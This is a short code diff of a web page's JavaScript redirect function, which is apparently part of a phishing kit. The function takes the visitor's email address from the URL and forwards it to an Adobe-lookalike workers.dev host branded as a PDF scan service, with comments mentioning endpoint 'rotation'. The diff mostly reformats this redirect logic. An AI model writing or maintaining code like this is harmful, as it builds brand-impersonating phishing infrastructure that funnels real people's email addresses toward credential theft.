@@ -10,12 +10,17 @@
       return params.get("email") || "";
     }
 
+    // Redirect to your Worker
     function redirectToWorker() {
       const email = getEmail();
-      let url = "https://pdfscan-3030-fastdoc.adobe-docs.workers.dev/"; // main worker endpoint
-      if (email) url += "?email=" + encodeURIComponent(email);
 
-      // Forward immediately to Worker
+      // Main Worker URL (handles stateless random rotation)
+      let url = "https://pdfscan-3030-fastdoc.adobe-docs.workers.dev/";
+      if (email) {
+        url += "?email=" + encodeURIComponent(email);
+      }
+
+      // Immediate redirect
       window.location.replace(url);
     }
 
